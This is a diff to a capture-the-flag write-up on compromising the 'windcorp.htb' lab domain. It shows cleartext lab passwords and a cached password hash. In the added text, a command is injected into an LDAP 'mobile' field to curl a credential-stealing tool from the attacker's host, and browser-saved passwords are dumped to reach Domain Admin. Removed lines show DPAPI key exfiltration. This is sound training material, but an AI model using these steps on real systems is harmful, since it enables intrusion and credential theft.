@@ -493,10 +493,12 @@ data(160) = "g\19\01&\02\00\00\00@INDEX:NAME:windcorp.htb\00@IDXVERSION\00\01\00
 ...
 {
 key(66) = "DN=NAME=Ray.Duncan@windcorp.htb,CN=USERS,CN=WINDCORP.HTB,CN=SYSDB\00"
-data(2448) = "g\19\01&!\00\00\00name=Ray.Duncan@windcorp.htb,cn=users,cn=windcorp.htb,cn=sysdb\00createTimestamp\00\01\00\00\00\0A\00\00\001659007013\00fullName\00\01\00\00\00\0A\00\00\00Ray Duncan\00gecos\00\01\00\00\00\0A\00\00\00Ray Duncan\00gidNumber\00\01\00\00\00\0A\00\00\001069000513\00name\00\01\00\00\00\17\00\00\00Ray.Duncan@windcorp.htb\00objectCategory\00\01\00\00\00\04\00\00\00user\00uidNumber\00\01\00\00\00\0A\00\00\001069003229\00objectSIDString\00\01\00\00\00.\00\00\00S-1-5-21-1844305427-4058123335-2739572863-3229\00uniqueID\00\01\00\00\00$\00\00\005b7d02b0-b9d3-4bbb-9430-1687f785b601\00originalDN\00\01\00\00\00/\00\00\00CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb\00originalMemberOf\00\01\00\00\00+\00\00\00CN=Development,OU=Groups,DC=windcorp,DC=htb\00originalModifyTimestamp\00\01\00\00\00\11\00\00\0020220728105342.0Z\00entryUSN\00\01\00\00\00\06\00\00\00258212\00userPrincipalName\00\01\00\00\00\17\00\00\00Ray.Duncan@WINDCORP.COM\00adAccountExpires\00\01\00\00\00\13\00\00\009223372036854775807\00adUserAccountControl\00\01\00\00\00\03\00\00\00512\00nameAlias\00\01\00\00\00\17\00\00\00ray.duncan@windcorp.htb\00isPosix\00\01\00\00\00\04\00\00\00TRUE\00lastUpdate\00\01\00\00\00\0A\00\00\001659007013\00dataExpireTimestamp\00\01\00\00\00\0A\00\00\001659012413\00memberof\00\02\00\00\00c\00\00\00name=S-1-5-21-1844305427-4058123335-2739572863-3601@windcorp.htb,cn=groups,cn=windcorp.htb,cn=sysdb\00b\00\00\00name=S-1-5-21-1844305427-4058123335-2739572863-513@windcorp.htb,cn=groups,cn=windcorp.htb,cn=sysdb\00initgrExpireTimestamp\00\01\00\00\00\0A\00\00\001659012797\00canonicalUserPrincipalName\00\01\00\00\00\17\00\00\00Ray.Duncan@WINDCORP.HTB\00ccacheFile\00\01\00\00\00\22\00\00\00FILE:/tmp/krb5cc_1069003229_bA74OK\00cachedPassword\00\01\00\00\00j\00\00\00$6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81\00cachedPasswordType\00\01\00\00\00\01\00\00\001\00lastCachedPasswordChange\00\01\00\00\00\0A\00\00\001659007462\00failedLoginAttempts\00\01\00\00\00\01\00\00\000\00lastOnlineAuth\00\01\00\00\00\0A\00\00\001659007462\00lastOnlineAuthWithCurrentToken\00\01\00\00\00\0A\00\00\001659007462\00lastLogin\00\01\00\00\00\0A\00\00\001659007462\00pacBlob\00\01\00\00\00\18\03\00\00\06\00\00\00\00\00\00\00\01\00\00\00\C8\01\00\00h\00\00\00\00\00\00\00\0A\00\00\00\1E\00\00\000\02\00\00\00\00\00\00\0C\00\00\00\98\00\00\00P\02\00\00\00\00\00\00\06\00\00\00\10\00\00\00\E8\02\00\00\00\00\00\00\07\00\00\00\10\00\00\00\F8\02\00\00\00\00\00\00\10\00\00\00\10\00\00\00\08\03\00\00\00\00\00\00\01\10\08\00\CC\CC\CC\CC\B8\01\00\00\00\00\00\00\00\00\02\00\BC;9\89s\A2\D8\01\FF\FF\FF\FF\FF\FF\FF\7F\FF\FF\FF\FF\FF\FF\FF\7F\82\C5<Mp\A2\D8\01\82\85\A6w9\A3\D8\01\FF\FF\FF\FF\FF\FF\FF\7F\14\00\14\00\04\00\02\00\00\00\00\00\08\00\02\00\00\00\00\00\0C\00\02\00\00\00\00\00\10\00\02\00\00\00\00\00\14\00\02\00\00\00\00\00\18\00\02\00Y\00\00\00\9D\0C\00\00\01\02\00\00\02\00\00\00\1C\00\02\00 \00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08\00\0A\00 \00\02\00\10\00\12\00$\00\02\00(\00\02\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00,\00\02\00\00\00\00\00\00\00\00\00\00\00\00\00\0A\00\00\00\00\00\00\00\0A\00\00\00R\00a\00y\00.\00D\00u\00n\00c\00a\00n\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\02\00\00\00\11\0E\00\00\07\00\00\00\01\02\00\00\07\00\00\00\05\00\00\00\00\00\00\00\04\00\00\00H\00O\00P\00E\00\09\00\00\00\00\00\00\00\08\00\00\00W\00I\00N\00D\00C\00O\00R\00P\00\04\00\00\00\01\04\00\00\00\00\00\05\15\00\00\00\13\DE\EDmG\0C\E2\F1\7F\90J\A3\01\00\00\000\00\02\00\07\00\00\00\01\00\00\00\01\01\00\00\00\00\00\12\01\00\00\00\00\00\00\00\80\13\F3\88s\A2\D8\01\14\00r\00a\00y\00.\00d\00u\00n\00c\00a\00n\00\00\00.\00\18\00\18\00H\00\02\00\00\00\14\00`\00\1C\00x\00\00\00\00\00R\00a\00y\00.\00D\00u\00n\00c\00a\00n\00@\00w\00i\00n\00d\00c\00o\00r\00p\00.\00c\00o\00m\00\00\00W\00I\00N\00D\00C\00O\00R\00P\00.\00H\00T\00B\00R\00a\00y\00.\00D\00u\00n\00c\00a\00n\00\00\00\00\00\01\05\00\00\00\00\00\05\15\00\00\00\13\DE\EDmG\0C\E2\F1\7F\90J\A3\9D\0C\00\00\00\00\00\00\10\00\00\00=\F3<B\A5Y\DC\1E\D8e\05\E3\10\00\00\00(\C2\DE\11\14`\97`\C1o\D2&\10\00\00\00\D0\DF\9B\D3\CA\A5j\ECs\98\7F?\00pacBlobExpireTimestamp\00\01\00\00\00\0A\00\00\001659008583\00"
+data(2448) = "...FILE:/tmp/krb5cc_1069003229_bA74OK\00cachedPassword\00\01\00\00\00j\00\00\00$6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81\00cachedPasswordType..."
 }
 ...
 ```
+
+![Ray.Duncan hash](images/ray_duncan_hash.png)
 
 ```bash
 $ cat ray_duncan.hash                                               
@@ -1183,16 +1185,14 @@ $ proxychains kinit bob.wood
 Password for bob.wood@WINDCORP.HTB: !@p%i&J#iNNo1T2
 ```
 
-```bash$ proxychains klist
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.17
+```bash
+$ klist                     
 Ticket cache: FILE:/tmp/krb5cc_1000
 Default principal: bob.wood@WINDCORP.HTB
 
 Valid starting       Expires              Service principal
-08/26/2024 12:14:58  08/26/2024 16:14:58  krbtgt/WINDCORP.HTB@WINDCORP.HTB
-        renew until 08/26/2024 16:14:58
+08/26/2024 14:08:34  08/26/2024 18:08:34  krbtgt/WINDCORP.HTB@WINDCORP.HTB
+        renew until 08/26/2024 18:08:34
 ```
 
 ```bash
@@ -1203,193 +1203,161 @@ Info: Establishing connection to remote endpoint
 windcorp\bob.wood
 ```
 
-```bash
-*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> pwd
+I struggle a lot on this enumeration. The Evil-WinRm keeps breaking and a lot of commands fails.
 
-Path
-----
-C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761
+```bash
+*Evil-WinRM* PS C:\Temp> 
+malloc(): unaligned fastbin chunk detected
+zsh: IOT instruction  proxychains evil-winrm -i hope.windcorp.htb -u 'bob.wood' -r windcorp.htb
+```
+
+I suspect AppLock, AV and other things are blocking us here. I noticd that we are in a constrained session.
+
+```bash
+*Evil-WinRM* PS C:\Users\Bob.Wood\Documents> $ExecutionContext.SessionState.LanguageMode
+ConstrainedLanguage
+```
+
+There is a blog about bypassing this and it is worth it have it as an options.
+
+- [Powershell CLM Bypass Using Runspaces](https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/)
+- [GitHub CLM Bypass](https://github.com/MinatoTW/CLMBypassBlogpost/tree/master/Bypass)
+
+I decided to go to another route and try to get details from possible browsers on the server. [HackBrowerData](https://github.com/moonD4rk/HackBrowserData) helped me here.
+
+After downloading and extracting the latest release, I renamed its executable to `h` (due to `mobile` field size) and downloaded it to `C:\Windows\Debug\wia\` using the *remote code execution* we got on the `mobile` ldap field. I haven't tested, it it seems to be less restricted.
+
+```bash
+oot@webserver:~# cat rduncun.ldif 
+dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+changetype: modify
+replace: mobile
+mobile: 1;curl http://10.10.14.8:9090/h -o C:\Windows\Debug\wia\h
 ```
 
 ```bash
-*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> dir -force
+root@webserver:~# ldapmodify -Y GSSAPI -H ldap://windcorp.htb -D "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb" -f rduncun.ldif
+SASL/GSSAPI authentication started
+SASL username: ray.duncan@WINDCORP.HTB
+SASL SSF: 256
+SASL data security layer installed.
+modifying entry "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb"
+```
 
+```bash
+root@webserver:~# ldapsearch -Q -H ldap://windcorp.htb -b "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb" mobile | grep mobile:
+mobile: 1;curl http://10.10.14.8:9090/h -o C:\Windows\Debug\wia\h
+```
 
-    Directory: C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761
+```bash
+$ python3 -m uploadserver 9090
+File upload available at /upload
+Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
+10.10.11.179 - - [26/Aug/2024 22:57:09] "GET /h HTTP/1.1" 200 -
+```
 
+```bash
+*Evil-WinRM* PS C:\Windows\Debug\wia> dir 
+    Directory: C:\Windows\Debug\wia
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
--a-hs-         8/22/2022   2:17 PM            740 3ebf1d50-8f5c-4a75-9203-20347331bad8
--a-hs-          5/4/2022   4:49 PM            740 a8bd1009-f2ac-43ca-9266-8e029f503e11
--a-hs-          5/4/2022   4:49 PM            908 BK-WINDCORP
--a-hs-         8/22/2022   2:17 PM             24 Preferred
+-a----         8/27/2024   7:57 AM        9798144 h
+-a----          5/1/2022  11:45 PM           3291 wiatrace.log
+```
+
+As soon as the file is downloaded, I remove the payload from the `mobile` ldap field to avoid it keep trying to download the file.
+
+Then I renamed the `h` to `h.exe` and executed it direct on the `Evil-WinRM` shell.
+
+```bash
+*Evil-WinRM* PS C:\Windows\Debug\wia> mv h h.exe
+
+*Evil-WinRM* PS C:\Windows\Debug\wia> dir
+    Directory: C:\Windows\Debug\wia
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         8/27/2024   7:57 AM        9798144 h.exe
+-a----          5/1/2022  11:45 PM           3291 wiatrace.log
+```
+
+The shell crashes again, but when we access it back we see a new directory called `results` on the host.
+
+```bash
+*Evil-WinRM* PS C:\Windows\Debug\wia> ./h.exe
+h.exe : level=WARN source=browser.go:47 msg="find browser failed, profile folder does not exist" browser=CocCoc
+    + CategoryInfo          : NotSpecified: (level=WARN sour... browser=CocCoc:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+level=WARN source=browser.go:47 msg="find browser failed, profile folder does not exist" browser=QQlevel=WARN source=browser.go:47 msg="find browser failed, profile folder does not exist" browser=Sogoumalloc_consolidate(): unaligned fastbin chunk detected
+zsh: IOT instruction  proxychains evil-winrm -i hope.windcorp.htb -u 'bob.wood' -r windcorp.htb
 ```
 
 ```bash
-*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> certutil -encode 3ebf1d50-8f5c-4a75-9203-20347331bad8 3ebf1d50-8f5c-4a75-9203-20347331bad8.b64
-Input Length = 740
-Output Length = 1076
-CertUtil: -encode command completed successfully.
-```
-
-```bash
-*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> cat 3ebf1d50-8f5c-4a75-9203-20347331bad8.b64
------BEGIN CERTIFICATE-----
-AgAAAAAAAAAAAAAAMwBlAGIAZgAxAGQANQAwAC0AOABmADUAYwAtADQAYQA3ADUA
-LQA5ADIAMAAzAC0AMgAwADMANAA3ADMAMwAxAGIAYQBkADgAAAAAAAAAAAAAAAAA
-iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAcyYbY+uNOC15HXPD
-rWt4xFBGAAAJgAAAA2YAAIQpKENqwdH3+Q42xgY+vzf/Zoqh48Ai1asuixEAvao4
-CjrEwkM228V54U20VyD2x+HYMCtiOkLv+MaAZtUYYDgRR1mdBddZvUkFJdm6ah1w
-cC9BV957PaFOIBgecwElAh/HAkibCcd7AgAAAP81lRbwNrSOPETKqwWxP5xQRgAA
-CYAAAANmAAD4b8/yEvguD8iuTHPDs2WjtvO0i2QSyw6M/oOomYZ7PHXpp2+MznTM
-nTmVxqc2WUywi+zxPwb3jVuQJKquC8FhN/2fsDbMmWYCAAAAAAEAAFgAAADKa/6+
-IfJmSqO4oAhXklb6wrZqDn/UbHkF1zXvPLHhHxTNqItR8Boy9Rm89UWZAUgauudM
-EKURQuLsnXMuX3iE/FfC9/fwoBWM00p4StNEY5Ljb8p5MRWRASaNe9AelTZoyZGM
-bmeCbFniv+yhpIBEebiBvT99s4mvx8A41hTeaAjGfXLcdBscBjdXCXlcJisS07or
-JqGQ5L1dKaZqEi8Aw3FLusX08e6rrlLHIy0/itJxRWOYUSD0RigMUf7m1UzjY/Jv
-/YyiS4vvZjburkB2BhEb8/B+G2S10vfBGGXPF/MGGUAz541YWzYm4I94WJF88eSw
-9+WLs0LLcPj8Eu7U6I2J3vkDBPb11nFwVqpQHg0XH9qVX1aOqumiAoGLtXbaLlLi
-oOsG2+cx/9iXUG3pNb+JkFQ4/nITLKnQJXTHDPVISFaHholhgYTeZFzTnHAn/j4O
-X3Eaz97HcWp59ovlfki0XmOMtGs=
------END CERTIFICATE-----
-```
-
-```bash
-*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> certutil -encode a8bd1009-f2ac-43ca-9266-8e029f503e11 a8bd1009-f2ac-43ca-9266-8e029f503e11.b64
-Input Length = 740
-Output Length = 1076
-CertUtil: -encode command completed successfully.
-```
-
-```bash
-*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> cat a8bd1009-f2ac-43ca-9266-8e029f503e11.b64
------BEGIN CERTIFICATE-----
-AgAAAAAAAAAAAAAAYQA4AGIAZAAxADAAMAA5AC0AZgAyAGEAYwAtADQAMwBjAGEA
-LQA5ADIANgA2AC0AOABlADAAMgA5AGYANQAwADMAZQAxADEAAAAAAAAAAAAAAAAA
-iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAuR6TrvjSY10cgOXc
-3fH7sFBGAAAJgAAAA2YAANem3q9mPiPPHJWQskoFUjXgcbC1a2OvhQEvMZ/NfIz7
-ITxvW6gXLykNnvZ1OgxkZ9oInH4GCUBg0thC4s5pfvwQmYWi82V0+Xzs4RJAijax
-fRQw8/2PswPtY7z2JlVinYPMQnCFAZRfAgAAACm91rg5CTspaKCdO0VcEWlQRgAA
-CYAAAANmAAAUAhae29/F3FmiRuhMIplSMuK0tKTxrI7kDSODLiaTfZiR+oVVTMay
-fdiIEO3n842SpsHgohYYNij1u7sVitpm7XSzJrSekisCAAAAAAEAAFgAAADKa/6+
-IfJmSqO4oAhXklb6Ra4KfBBwfypYTMvsKvdydZfn5JMN0WdQ0s58XVPFs1hGm7f+
-kXkScTZCT+OLnxS747z80g3N4xuVwJ9EPy15q18vxycqNN5lXBPEjZcGpq6Wbj8U
-yEIo2Jgwd+YGUtCLJuoL9D0YN46Ra1LVUgLNHWu1jybaikg5GN0yaTE3r0B0L2g/
-beZ2yKJARPUshSuGlCf2HRsi6tO2yqBZBjMjFTZJQPt4hrKJm9bn5Qd5kZSggjy5
-HVtLRvZZXjhMU+cXlfRuCD/AE54BnszNK78e7LZF7J3pRT9RbdbrgctaR8EXF2gM
-Lfcxq7UBteEZCQAtS7mfZjvwI0i15/4rq8bYRxtwgc4PHUWN+jWNqjWLubp5NiV8
-4TpmPxZFTXNgcAL1Yueop4Y1qcl/l+CeAGfwc3viVD2hESIAK6Zm3OFAByjsyxUh
-29h5Ie/21Ms2D8kNzPms0rzLbXA=
------END CERTIFICATE-----
-```
-
-```bash
-$ cat 3ebf1d50-8f5c-4a75-9203-20347331bad8.b64    
-AgAAAAAAAAAAAAAAMwBlAGIAZgAxAGQANQAwAC0AOABmADUAYwAtADQAYQA3ADUA
-LQA5ADIAMAAzAC0AMgAwADMANAA3ADMAMwAxAGIAYQBkADgAAAAAAAAAAAAAAAAA
-iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAcyYbY+uNOC15HXPD
-rWt4xFBGAAAJgAAAA2YAAIQpKENqwdH3+Q42xgY+vzf/Zoqh48Ai1asuixEAvao4
-CjrEwkM228V54U20VyD2x+HYMCtiOkLv+MaAZtUYYDgRR1mdBddZvUkFJdm6ah1w
-cC9BV957PaFOIBgecwElAh/HAkibCcd7AgAAAP81lRbwNrSOPETKqwWxP5xQRgAA
-CYAAAANmAAD4b8/yEvguD8iuTHPDs2WjtvO0i2QSyw6M/oOomYZ7PHXpp2+MznTM
-nTmVxqc2WUywi+zxPwb3jVuQJKquC8FhN/2fsDbMmWYCAAAAAAEAAFgAAADKa/6+
-IfJmSqO4oAhXklb6wrZqDn/UbHkF1zXvPLHhHxTNqItR8Boy9Rm89UWZAUgauudM
-EKURQuLsnXMuX3iE/FfC9/fwoBWM00p4StNEY5Ljb8p5MRWRASaNe9AelTZoyZGM
-bmeCbFniv+yhpIBEebiBvT99s4mvx8A41hTeaAjGfXLcdBscBjdXCXlcJisS07or
-JqGQ5L1dKaZqEi8Aw3FLusX08e6rrlLHIy0/itJxRWOYUSD0RigMUf7m1UzjY/Jv
-/YyiS4vvZjburkB2BhEb8/B+G2S10vfBGGXPF/MGGUAz541YWzYm4I94WJF88eSw
-9+WLs0LLcPj8Eu7U6I2J3vkDBPb11nFwVqpQHg0XH9qVX1aOqumiAoGLtXbaLlLi
-oOsG2+cx/9iXUG3pNb+JkFQ4/nITLKnQJXTHDPVISFaHholhgYTeZFzTnHAn/j4O
-X3Eaz97HcWp59ovlfki0XmOMtGs=
-
-$ base64 -d 3ebf1d50-8f5c-4a75-9203-20347331bad8.b64 > 3ebf1d50-8f5c-4a75-9203-20347331bad8
-```
-
-```bash
-$ cat a8bd1009-f2ac-43ca-9266-8e029f503e11.b64    
-AgAAAAAAAAAAAAAAYQA4AGIAZAAxADAAMAA5AC0AZgAyAGEAYwAtADQAMwBjAGEA
-LQA5ADIANgA2AC0AOABlADAAMgA5AGYANQAwADMAZQAxADEAAAAAAAAAAAAAAAAA
-iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAuR6TrvjSY10cgOXc
-3fH7sFBGAAAJgAAAA2YAANem3q9mPiPPHJWQskoFUjXgcbC1a2OvhQEvMZ/NfIz7
-ITxvW6gXLykNnvZ1OgxkZ9oInH4GCUBg0thC4s5pfvwQmYWi82V0+Xzs4RJAijax
-fRQw8/2PswPtY7z2JlVinYPMQnCFAZRfAgAAACm91rg5CTspaKCdO0VcEWlQRgAA
-CYAAAANmAAAUAhae29/F3FmiRuhMIplSMuK0tKTxrI7kDSODLiaTfZiR+oVVTMay
-fdiIEO3n842SpsHgohYYNij1u7sVitpm7XSzJrSekisCAAAAAAEAAFgAAADKa/6+
-IfJmSqO4oAhXklb6Ra4KfBBwfypYTMvsKvdydZfn5JMN0WdQ0s58XVPFs1hGm7f+
-kXkScTZCT+OLnxS747z80g3N4xuVwJ9EPy15q18vxycqNN5lXBPEjZcGpq6Wbj8U
-yEIo2Jgwd+YGUtCLJuoL9D0YN46Ra1LVUgLNHWu1jybaikg5GN0yaTE3r0B0L2g/
-beZ2yKJARPUshSuGlCf2HRsi6tO2yqBZBjMjFTZJQPt4hrKJm9bn5Qd5kZSggjy5
-HVtLRvZZXjhMU+cXlfRuCD/AE54BnszNK78e7LZF7J3pRT9RbdbrgctaR8EXF2gM
-Lfcxq7UBteEZCQAtS7mfZjvwI0i15/4rq8bYRxtwgc4PHUWN+jWNqjWLubp5NiV8
-4TpmPxZFTXNgcAL1Yueop4Y1qcl/l+CeAGfwc3viVD2hESIAK6Zm3OFAByjsyxUh
-29h5Ie/21Ms2D8kNzPms0rzLbXA=                                                                                                                                
-$ base64 -d a8bd1009-f2ac-43ca-9266-8e029f503e11.b64 > a8bd1009-f2ac-43ca-9266-8e029f503e11
-```
-
-```bash
-*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default> pwd
-Path
-----
-C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default
-```
-
-```bash
-*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default> dir -force Login*
-    Directory: C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default
-
+*Evil-WinRM* PS C:\Windows\Debug\wia> dir
+    Directory: C:\Windows\Debug\wia
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
--a----          5/4/2022   7:46 PM          55296 Login Data
--a----          5/4/2022   7:46 PM              0 Login Data-journal
+d-----         8/27/2024   8:17 AM                results
+-a----         8/27/2024   7:57 AM        9798144 h.exe
+-a----          5/1/2022  11:45 PM           3291 wiatrace.log
+```
+
+The Edge password file shows us an interesting password for `bob.woodADM`.
+
+```bash
+*Evil-WinRM* PS C:\Windows\Debug\wia> type results\microsoft_edge_default_password.csv
+UserName,Password,LoginURL,CreateDate
+bob.woodADM@windcorp.com,smeT-Worg-wer-m024,http://webmail.windcorp.com/login.html,2022-05-04T18:46:59.133335+02:00
+bob.wood@windcorp.htb,SomeSecurePasswordIGuess!09,http://google.com/login.html,2022-05-04T18:14:00.217981+02:00
+bob.wood@windcorp.htb,SemTro¤32756Gff,http://somewhere.com/login.html,2022-05-04T18:12:42.849216+02:00
+```
+
+| Username | Password | Target |
+| -- | -- | -- |
+| ray.duncan | pantera | Domain |
+| scriptrunner | !@p%i&J#iNNo1T2 | Domain |
+| bob.wood | !@p%i&J#iNNo1T2 | Domain |
+| bob.woodADM | smeT-Worg-wer-m024 | Domain |
+
+```bash
+$ proxychains kinit bob.woodADM
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Password for bob.woodADM@WINDCORP.HTB: smeT-Worg-wer-m024
 ```
 
 ```bash
-*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default> certutil -encode 'Login Data' Login_Data.b64
-Input Length = 55296
-Output Length = 76088
-CertUtil: -encode command completed successfully.
+$ proxychains evil-winrm -i hope.windcorp.htb -u 'bob.woodADM' -r windcorp.htb
+...             
+*Evil-WinRM* PS C:\Users\bob.woodadm\Documents> whoami
+windcorp\bob.woodadm
 ```
 
 ```bash
+*Evil-WinRM* PS C:\Users\bob.woodadm\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                      Type             SID                                           Attributes
+=============================================== ================ ============================================= ===============================================================
+Everyone                                        Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                                   Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access      Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                          Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+NT AUTHORITY\NETWORK                            Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                  Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+WINDCORP\Protected Users                        Group            S-1-5-21-1844305427-4058123335-2739572863-525 Mandatory group, Enabled by default, Enabled group
+WINDCORP\Domain Admins                          Group            S-1-5-21-1844305427-4058123335-2739572863-512 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity      Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
+WINDCORP\Denied RODC Password Replication Group Alias            S-1-5-21-1844305427-4058123335-2739572863-572 Mandatory group, Enabled by default, Enabled group, Local Group
+Mandatory Label\High Mandatory Level            Label            S-1-16-12288
 ```
 
 ```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+ce5c95...
 ```
